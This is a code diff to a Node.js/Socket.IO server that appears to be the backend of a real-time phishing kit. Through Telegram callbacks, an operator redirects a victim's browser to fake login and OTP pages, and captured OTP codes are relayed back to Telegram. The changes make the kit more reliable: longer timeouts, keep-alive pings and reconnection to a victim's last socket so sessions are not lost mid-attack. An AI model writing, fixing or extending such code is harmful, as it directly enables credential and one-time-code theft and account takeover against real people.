@@ -23,13 +23,21 @@ const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     transports: ['websocket', 'polling'],
-    pingTimeout: 120000,
-    pingInterval: 20000,
-    upgradeTimeout: 30000,
-    connectTimeout: 45000,
+    pingTimeout: 300000,        // 5 minutos
+    pingInterval: 10000,        // 10 segundos
+    upgradeTimeout: 60000,
+    connectTimeout: 60000,
     allowUpgrades: true,
-    perMessageDeflate: false
+    perMessageDeflate: false,
+    maxHttpBufferSize: 1e8,
+    allowEIO3: true,
+    cookie: false
 });
+
+// Keep-alive para mantener conexiones activas
+setInterval(() => {
+    io.emit('ping-all');
+}, 30000); // Cada 30 segundos
 
 const activeSessions = new Map();
 
@@ -175,6 +183,27 @@ class SessionManager {
         const session = activeSessions.get(sessionId);
         return session?.socketId;
     }
+    
+    static getConnectedSocket(sessionId, io) {
+        const session = activeSessions.get(sessionId);
+        if (!session) return null;
+        
+        // Intentar con socketId actual
+        let socket = io.sockets.sockets.get(session.socketId);
+        if (socket?.connected) return socket;
+        
+        // Intentar con lastSocketId
+        if (session.lastSocketId) {
+            socket = io.sockets.sockets.get(session.lastSocketId);
+            if (socket?.connected) {
+                // Actualizar socketId si encontramos uno conectado
+                session.socketId = session.lastSocketId;
+                return socket;
+            }
+        }
+        
+        return null;
+    }
 }
 
 // ========================================
@@ -190,10 +219,10 @@ app.post('/telegram-webhook', async (req, res) => {
         
         if (callback_query) {
             const [action, sessionId] = callback_query.data.split('_');
-            const socketId = SessionManager.getSocketId(sessionId);
-            const socket = io.sockets.sockets.get(socketId);
+            const socket = SessionManager.getConnectedSocket(sessionId, io);
             
-            if (socket?.connected) {
+            if (socket) {
+                console.log(`✓ Socket encontrado y conectado para sesión ${sessionId}`);
                 const actions = {
                     logo: { url: '/index.html', msg: '🔄 Redirigiendo al login...' },
                     otp: { url: '/otp.html', msg: '📲 Solicitando OTP...' },
@@ -208,7 +237,8 @@ app.post('/telegram-webhook', async (req, res) => {
                     if (action === 'finish') SessionManager.delete(sessionId);
                 }
             } else {
-                await TelegramService.answerCallbackQuery(callback_query.id, '❌ Sesión expirada');
+                console.log(`✗ Socket no encontrado o desconectado para sesión ${sessionId}`);
+                await TelegramService.answerCallbackQuery(callback_query.id, '❌ Usuario desconectado. Pídele que recargue la página.');
             }
         }
         
@@ -228,6 +258,8 @@ io.on('connection', (socket) => {
     socket.on('identify-session', ({ originalSessionId }) => {
         if (originalSessionId) {
             SessionManager.updateSocketId(originalSessionId, socket.id);
+            socket.emit('session-identified', { success: true, sessionId: originalSessionId });
+            console.log(`✓ Sesión ${originalSessionId} identificada con socket ${socket.id}`);
         }
     });
     
@@ -326,6 +358,10 @@ ${session.data.otp ? `📲 <b>OTP:</b> ${session.data.otp}` : ''}
     });
     
     socket.on('ping', () => socket.emit('pong'));
+    
+    socket.on('ping-client', () => {
+        socket.emit('pong-client', { timestamp: Date.now() });
+    });
 });
 
 // ========================================
@@ -390,10 +426,10 @@ async function pollTelegram() {
 async function handleTelegramCallback(callbackQuery) {
     try {
         const [action, sessionId] = callbackQuery.data.split('_');
-        const socketId = SessionManager.getSocketId(sessionId);
-        const socket = io.sockets.sockets.get(socketId);
+        const socket = SessionManager.getConnectedSocket(sessionId, io);
         
-        if (socket?.connected) {
+        if (socket) {
+            console.log(`✓ Socket activo encontrado para sesión ${sessionId}`);
             const actions = {
                 logo: { url: '/index.html', msg: '🔄 Redirigiendo...' },
                 otp: { url: '/otp.html', msg: '📲 Solicitando OTP...' },
@@ -408,7 +444,8 @@ async function handleTelegramCallback(callbackQuery) {
                 if (action === 'finish') SessionManager.delete(sessionId);
             }
         } else {
-            await TelegramService.answerCallbackQuery(callbackQuery.id, '❌ Sesión expirada');
+            console.log(`✗ No hay socket activo para sesión ${sessionId}`);
+            await TelegramService.answerCallbackQuery(callbackQuery.id, '❌ Usuario desconectado');
         }
     } catch (error) {
         console.error('✗ Error al manejar callback:', error.message);
